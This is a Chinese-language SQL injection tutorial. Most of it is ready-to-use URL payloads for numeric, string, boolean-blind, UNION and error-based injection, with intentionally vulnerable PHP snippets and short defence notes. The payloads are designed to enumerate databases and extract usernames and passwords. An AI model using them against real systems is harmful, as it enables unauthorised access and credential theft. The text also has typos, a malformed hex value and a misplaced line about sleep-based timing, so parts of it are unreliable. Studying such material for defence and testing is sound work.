数字型

>>> 参数为整数类型（ID，页码），未经过严格过滤的。

典型漏洞代码：

$id=$_GET['id']; // 未过滤用户输入
$sql="SELECT * FROM users WHERE id = %id";

>>> 攻击通过修改整数参数，改变SQL语句的逻辑

1、是否存在注入：

http://example.com?id=1      // 正常返回
http://example.com?id=1'     // 报错（单引号破坏语法）
http://example.com?id=1 AND 1=1  // 正常返回
http://example.com?id=1 AND 1=2  // 无返回（逻辑为假）

2、获取数据库信息：

http://example.com?id=1 and 1=(select 1 from users) // 验证表存在
http://example.com?id=1 and 1=(select count(*) from users) // 获取行数

3、报错注入（看是否支持）：

http://example.com?id=1 AND (SELECT 1 FROM (SELECT COUNT(*),CONCAT(0x7e,(SELECT username FROM users LIMIT 0,1),0x7e,FLOOR(RAND(0)*2))x FROM information_schema.tables GROUP BY x)a)  // 报错带出用户名

字符型

>>> 参数为字符串类型（用户名，搜索关键词），未正确转义引用

典型漏洞代码：

$name = $_GET['name'];  // 未过滤用户输入
$sql = "SELECT * FROM users WHERE username = '$name'";

>>> 通过闭合单引号，注入额外SQL代码

1、判断是否存在漏洞

http://example.com?name=test      // 正常返回
http://example.com?name=test'     // 报错（单引号破坏语法）
http://example.com?name=test'--   // 注释掉后续代码，正常返回

2、获取数据库信息

http://example.com?name=' OR 1=1 --  // 绕过验证，返回所有记录
http://example.com?name=' UNION SELECT 1,database(),3 --  // 获取当前数据库名

3、获取表名和列表

http://example.com?name=' union select 1, table_name, 3 from information_schema.tables where table_schem=database() limit 0,1 -- // 获取第一个表名

4、防御措施

使用预编译语句（Prepared Statements）：$stmt = $pdo->prepare("SELECT * FROM users WHERE id = :id");
$stmt->execute(['id' => $_GET['id']]); // 自动处理类型和转义

布尔盲注

>>> 应用程序不返回SQL错误信息或查询结果，但会根据SQL语句的真假值返回不同页面（如登录成功/失败，搜索结果有/无），

因此通过狗仔条件语句，逐位猜测。

1、判断是否存在注入：

http://example.com?name=test' AND 1=1 --  // 返回正常页面
http://example.com?name=test' AND 1=2 --  // 返回异常页面

2、猜测数库名字长度：

http://example.com?name=test?' and length(database())=8 -- // 若返回正常， 说明数据库名长度为8

3、逐位猜测数据库名;

http://example.com?name=test' and substring(database(),1,1)='s' -- // 猜测第一位是否为's'
http://example.com?name=test' and ascii(substring(database(), 1, 1))=115 -- // 等价于上一条

UNION注入

>>> union操作符合并多个查询结果，并且前后查询的字段数相同，即：

1，前后查询的字段数必须一致

2，字段类型需兼容（例如：数字型字段不能插入字符串）

>>> 攻击步骤：

1、判断字段数：

http://example.com?id=1 UNION SELECT 1 --  // 报错（字段数不匹配）
http://example.com?id=1 UNION SELECT 1,2 --  // 报错
http://example.com?id=1 UNION SELECT 1,2,3 --  // 正常返回，说明字段数为3

2、判断可显示字段：

http://example.com?id=1 UNION SELECT 'a','b','c' --  // 若页面出现a/b/c，说明对应字段可显示

3、获取数据库信息：

http://example.com?id=1 union select 1,database(),3 -- // 获取当前数据库名称
http://example.com?id=1 UNION SELECT 1,(SELECT GROUP_CONCAT(table_name) FROM information_schema.tables WHERE table_schema=database()),3 --  // 获取所有表名
http://example.com?id=1 UNION SELECT 1,(SELECT GROUP_CONCAT(column_name) FROM information_schema.columns WHERE table_name='users'),3 --  // 获取users表的所有列名
http://example.com?id=1 UNION SELECT 1,(SELECT GROUP_CONCAT(username,':',password) FROM users),3 --  // 获取用户和密码

如果执行了sleep，就说明猜中了

报错注入

>>> 利用数据库错误函数（如：updatexml，exp，Oracle，OWA_UTIL.WHO_CALLED_ME）强制触发错误，并在错误信息中夹带敏感信息。

适用于无法返回详细信息时候，无法使用union注入时候

>>> 常见报错：

数据库报错函数示例Payload
MySQLUPDATEXML()' AND UPDATEXML(1,CONCAT(0x7e,(SELECT USER()),0x7e),1) -- -
EXP()' AND EXP(~(SELECT * FROM(SELECT USER())a)) -- -
SQL ServerFLOOR()'; SELECT * FROM(SELECT COUNT(*),CONCAT(0x7e,(SELECT USER()),0x7e,FLOOR(RAND(0)*2))a FROM sysobjects GROUP BY a)b -- -
OracleOWA_UTIL.WHO_CALLED_ME' AND OWA_UTIL.WHO_CALLED_ME((SELECT USER FROM DUAL)) -- -

>>> 攻击步骤：

1、判断注入点：

' and updatexml(1, concat(0x7e, 'TEST', 0x7e), 1) -- - # 若错误信息包含~TEST~,存在注入

2、获取敏感数据：

# 获取数据库名称
' and updatexml(1, concat(0x7e, database(), 0x73), 1) -- -
# 获取用户表数据
' and updatexml(1, concat(0x7e, (select concat(username, ':', password) from users limit 0,1), 0x7e),1) -- -

3、防御措施：生产环境金童详细错误信息（display_errors=off）或使用预编译语句
